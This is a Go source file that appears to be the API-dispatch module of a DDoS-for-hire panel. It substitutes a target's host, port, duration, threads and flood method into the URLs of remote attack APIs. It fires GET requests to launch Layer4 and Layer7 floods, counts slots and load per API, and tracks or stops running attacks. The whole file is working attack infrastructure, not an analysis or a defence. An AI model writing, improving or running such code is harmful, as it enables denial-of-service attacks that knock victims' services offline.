// apis.go
package apis

import (
	"api/core/models/floods"
	"fmt"
	"math"

	"net/http"
	"api/core/models/log"
	"strings"
	"time"
)

var (
	Apis map[string]*Api
)

type Api struct {
	Name    string            `json:"name"`
	Type    string            `json:"type"`
	Slots   int               `json:"slots"`
	URL     string            `json:"url"`
	Methods map[string]string `json:"methods"`
	running int
}

// Define a struct to track ongoing attacks
type OngoingAttack struct {
	api    *Api
	attack *floods.Attack
}

// Map to store ongoing attacks
var ongoingAttacks = make(map[*floods.Attack]*OngoingAttack)

// Function to start tracking an ongoing attack
func trackAttack(api *Api, attack *floods.Attack) {
	ongoingAttacks[attack] = &OngoingAttack{
		api:    api,
		attack: attack,
	}
	duration := time.Duration(attack.Duration) * time.Second
	<-time.After(duration)
	api.running--
	delete(ongoingAttacks, attack)
	log.Printf("Attack on API %s finished.\n", api.Name)
}

// Slots returns the total available slots across all APIs
func Slots() int {
	var totalSlots int
	for _, api := range Apis {
		totalSlots += api.Slots
	}
	return totalSlots
}

func Slots7() int {
	var totalSlots7 int
	for _, api := range Apis {
		if api.Type == "Layer7" {
			totalSlots7 += api.Slots
		}
	}
	return totalSlots7
}
func Slots4() int {
	var totalSlots4 int
	for _, api := range Apis {
		if api.Type == "Layer4" {
			totalSlots4 += api.Slots
		}
	}
	return totalSlots4
}

func Send(a *floods.Attack) error {
	terms := strings.NewReplacer("$host", a.Target,
		"$port", fmt.Sprint(a.Port),
		"$time", fmt.Sprint(a.Duration),
		"$threads", fmt.Sprint(a.Threads),
	)
	for _, api := range Apis {
		c := http.DefaultClient
		method, ok := api.Methods[a.Method.Sname]
		if !ok {
			return fmt.Errorf("skipping APIs trying servers...")
		}
		url := terms.Replace(api.URL)
		url = strings.ReplaceAll(url, "$method", method)
		fmt.Println(url, a.Method.Sname)
		resp, err := c.Get(url)
		if err != nil {
			return fmt.Errorf("error sending attack via API %s: %v", api.Name, err)
		}
		if resp.StatusCode == 200 {
			log.Println("successfully sent attack using " + api.Name)
			api.running++
			go trackAttack(api, a)
			continue
		} else if resp.StatusCode == 404 {
			log.Println("successfully sent attack using " + api.Name)
			api.running++
			go trackAttack(api, a)
			continue
		} else {
			return fmt.Errorf("error occurred while sending attack using %s: StatusCode %d", api.Name, resp.StatusCode)
		}
		
	}
	return nil
}
func (api *Api) Load() float64 {
	log.Println(api.Name, api.running, api.Slots, fmt.Sprintf("%.2f", (float64(api.running)/float64(api.Slots))*100))
	return toFixed(((float64(api.running) / float64(api.Slots)) * 100), 2)
}
func (s *Api) Running() int {
	return s.running
}

func round(num float64) int {
	return int(num + math.Copysign(0.5, num))
}
func toFixed(num float64, precision int) float64 {
	output := math.Pow(10, float64(precision))
	return float64(round(num*output)) / output
}

// Stop stops ongoing attack on a specific API
func Stop(target string) {
	for _, ongoing := range ongoingAttacks {
		api := ongoing.api
		attack := ongoing.attack
		if strings.Contains(api.URL, target) {
			api.running--
			delete(ongoingAttacks, attack)
			log.Printf("Stopped ongoing attack on API: %s\n", api.Name)
		}
	}
}
